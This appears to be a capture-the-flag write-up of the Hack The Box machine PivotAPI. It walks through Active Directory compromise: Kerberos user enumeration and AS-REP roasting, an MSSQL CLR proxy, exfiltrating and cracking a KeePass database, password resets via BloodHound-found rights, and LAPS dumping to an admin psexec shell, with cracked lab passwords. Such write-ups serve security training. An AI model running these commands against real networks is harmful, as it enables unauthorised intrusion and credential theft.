Nmap

```bash
sudo nmap -sC -sV -oA nmap/pivotapi 10.10.10.240

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-19-21  02:06PM               103106 10.1.1.414.6453.pdf
| 02-19-21  02:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
| 02-19-21  11:55AM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
| 02-19-21  02:06PM              1018160 ExploitingSoftware-Ch07.pdf
| 08-08-20  12:18PM               219091 notes1.pdf
| 08-08-20  12:34PM               279445 notes2.pdf
| 08-08-20  12:41PM                  105 README.txt
|_02-19-21  02:06PM              1301120 RHUL-MA-2009-06.pdf
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   3072 fa:19:bb:8d:b6:b6:fb:97:7e:17:80:f5:df:fd:7f:d2 (RSA)
|   256 44:d0:8b:cc:0a:4e:cd:2b:de:e8:3a:6e:ae:65:dc:10 (ECDSA)
|_  256 93:bd:b6:e2:36:ce:72:45:6c:1d:46:60:dd:08:6a:44 (ED25519)
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-06 16:41:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2021-11-06T16:42:28+00:00; +1h14m06s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-11-06T16:39:54
|_Not valid after:  2051-11-06T16:39:54
| ms-sql-ntlm-info: 
|   Target_Name: LICORDEBELLOTA
|   NetBIOS_Domain_Name: LICORDEBELLOTA
|   NetBIOS_Computer_Name: PIVOTAPI
|   DNS_Domain_Name: LicorDeBellota.htb
|   DNS_Computer_Name: PivotAPI.LicorDeBellota.htb
|   DNS_Tree_Name: LicorDeBellota.htb
|_  Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: LicorDeBellota.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PIVOTAPI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m06s, deviation: 0s, median: 1h14m06s
| smb2-time: 
|   date: 2021-11-06T16:41:51
|_  start_date: N/A
| ms-sql-info: 
|   10.10.10.240:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.71 seconds

```


ftp login

```bash

wget -m ftp://10.10.10.240/

```

exif tool on the pdfs 

```bash

exiftool * | grep -i "creator\|Author" | awk -F: ' { print $2 }'

```

Kerburte

```bash

git clone https://github.com/ropnop/kerbrute.git

```

```bash

./kerbrute -d LicorDeBellota.htb --dc 10.10.10.240 userenum user.txt

impacket-GetNPUsers LICORDEBELLOTA.HTB/ -dc-ip 10.10.10.240 -usersfile ../../user.txt  -no-pass
```

![](20211106214311.png)

save the hash and crack it

downgrade to 23 encryption to crack

```bash

./kerbrute -d LicorDeBellota.htb --dc 10.10.10.240 userenum user.txt --downgrade

```

```bash

sudo john -w=rockyou.txt newhash.txt

```

|user | Password |
|---|---|
| Kaorz |Roper4155 |

### crackmapexec

```bash

cme smb 10.10.10.240  -u Kaorz -p Roper4155
SMB         10.10.10.240    445    PIVOTAPI         [*] Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.240    445    PIVOTAPI         [+] LicorDeBellota.htb\Kaorz:Roper4155

```

account is valid.

lets enumerate smb shares more

```bash
cme smb 10.10.10.240  -u Kaorz -p Roper4155 --shares -M spider_plus
```

output is stored at /tmp

map values of the key

```bash

cat 10.10.10.240.json | jq '.| map_values(keys)'
```

use smbclient to download files

```bash
smbclient -U Kaorz //10.10.10.240/NetLogon
mget *

```

convert .msg files to ascii readable format in terminal

```bash
msgconvert *.msg
```

![](20211107082113.png)

add new user to user list

new user is also valid

![](20211107082542.png)

|default user name | password|
|---|---|
|svc_oracle |#oracle_s3rV1c3!2020|

### mssql shell

```bash

python3 mssqlclient.py sa@10.10.10.240


```

|default user name | password|
|---|---|
|sa |#mssql_s3rV1c3!2020|

```bash
enable_ole

upload reciclador.dll C:\Windows\temp\reciclador.dll

mv assembly.dll Microsoft.SqlServer.Proxy.dll

python3 mssqlclient.py sa@10.10.10.240 -install -clr Microsoft.SqlServer.Proxy.dll

python3 mssqlclient.py sa@10.10.10.240 -check -reciclador 'C:\Windows\temp\reciclador.dll'

python3 mssqlclient.py sa@10.10.10.240 -start -reciclador 'C:\Windows\temp\reciclador.dll'


```

![](20211107145909.png)

Listening on port 1337

edit proxychains.config to connect

![](20211107150118.png)

### winrm via proxy

```bash

proxychains4 evil-winrm -u svc_mssql -p '#mssql_s3rV1c3!2020' -i 127.0.0.1

```

![](20211107151804.png)

![](20211107153103.png)

Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.

Credentials download successfully.

converting to base64

```bash

$FilePath = "C:\Users\svc_mssql\Desktop\credentials.kdbx"
$File = [System.IO.File]::ReadAllBytes($FilePath);
$Base64String=[System.Convert]::ToBase64String($File);
```

passing the creds to john

```bash

keepass2john credentials.kdbx

credentials:$keepass$*2*60000*0*006e4f7f747a915a0301bded09da8339260ff96caf1ca7cef63b8fdd37c6a836*deabca672663938eddc0ee9e2726d9ff65d4ab7c6863f6f712f1c14b97c670a2*b33392502f94cd323ed25bc2d9c1749a*67ac769a9693b2ef7f1a149fb4e182042fcd2888df727ef4226edb5d9ae35c5c*dccf52b56e846bf088caa284beeaceffe16f304586ee13e87197387bac16ca6b

```

cracking using john

![](20211107160241.png)

### Keepass
|User|Password|
|---|---|
|keepass|mahalkita|

Install keepass

```bash

sudo apt-get install keepassx

```

open the keepassx and select open database from

![](20211107161147.png)

paste the password

![](20211107161231.png)

got username and password

![](20211107161352.png)

![](20211107161428.png)

|user|password|
|---|---|
|3v4Si0N|Gu4nCh3C4NaRi0N!23|

# User
### ssh
![](20211107161646.png)

we don't have any privileges to developer folder

![](20211107162051.png)

### bloodhound

download bloodhound from python

`pip install bloodhound`

```bash

bloodhound-python -u 3v4Si0N@licorDeBellota.htb -ns 10.10.10.240 -d licorDeBellota.htb -p 'Gu4nCh3C4NaRi0N!23' -c all

-rw-r--r-- 1 aju aju 997 Nov  7 16:28 20211107162806_computers.json
-rw-r--r-- 1 aju aju 469 Nov  7 16:28 20211107162806_domains.json
-rw-r--r-- 1 aju aju 24K Nov  7 16:28 20211107162806_groups.json
-rw-r--r-- 1 aju aju 14K Nov  7 16:28 20211107162806_users.json


```

Install bloodhound gui 

```bash

sudo apt-get install bloodhound -y

```

after installing start neo4j server by

```bash

sudo neo4j console

```
for the 1st time users yoou need to authenticate with server at localhost:7474

using default credentials

|user name | password |
|---|---|
|neo4j| neo4j|

after authentication reset the password in the browser.

Now open Bloodhound GUI and authenticate with new creds

![](20211107164409.png)

upload the earlier json by drag and drop

![](20211107164630.png)

finding all admins

![](20211107164733.png)

mark owned users

3v4Si0N

![](20211107164946.png)

srv_mssql
![](20211107165106.png)

kaorz

![](20211107165200.png)

Shortest path from owned principals

![](20211107165437.png)

![](20211107170048.png)

Resetting password for DR.ZAIUSS

![](20211107170656.png)

```bash

net user Dr.Zaiuss p@ssw0wrd12345

```

![](20211107170855.png)

forwarding the port Dr.zaiuss is winrm only.

```bash

evil-winrm -i 127.0.0.1 -u Dr.Zaiuss  -p p@ssw0wrd12345

```

![](20211107171121.png)

Mark Dr.zaiuss as owned

![](20211107171322.png)

## SUPERFUME
Dr. zaiuss has generic all to two users so we can change password  of both

![](20211107171910.png)

superfume is member of three groups including `developer` we can reset superfume 

![](20211107172241.png)

```bash
net user superfume p@ssw0wrd12345

evil-winrm -i 127.0.0.1 -u superfume -p p@ssw0wrd12345

```

![](20211107172719.png)

after reseting we can acess the folder developer

![](20211107173011.png)

Then download file 

![](20211107173357.png)

copy to windows machine

![](Pasted image 20211107212020.png)

![](Pasted image 20211107212417.png)

console.print(Encoding.Default.GetString(array));



![](Pasted image 20211107212648.png)

|user|password|
|---|---|
|jari|Cos@Chung@!RPG|

mark superfume and jari as owned in bloodhound and we get shortest path

![](20211107174202.png)



Loggin as jari

```bash

evil-winrm -i 127.0.0.1 -u jari -p 'Cos@Chung@!RPG'

```

download powerview.ps1 from https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

we can load script with evil-winrm

```bash

evil-winrm -i 127.0.0.1 -u jari -p 'Cos@Chung@!RPG' -s ps

Bypass-4MSI

PowerView.ps1

$pwd = ConvertTo-SecureString 'p@ssw0wrd12345' -AsPlaintext -Force


```


Giving Gibdeon laps adm and laps read groups, thus we can leverage this to read the administrator's password from the LAPS service using LAPS dumper.

```sh

$pwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity gibdeon -AccountPassword $pwd

$cred = New-Object System.Management.Automation.PSCredential('LicorDeBellota\Gibdeon', $pwd)

Add-AdGroupMember -Identity 'laps adm' -Members gibdeon -Credential $cred
Add-AdGroupMember -Identity 'laps read' -Members gibdeon -Credential $cred

```


### laps.py

[laps](https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py)

```bash

python3 laps.py -u gibdeon -p 'Password123!' -d LicorDeBellota.htb -l 10.10.10.240

PIVOTAPI$:9EQG95qdtjb9QRj8A4D9

```

# Root

```bash

impacket-psexec administrador@10.10.10.240

```

![](20211107185853.png)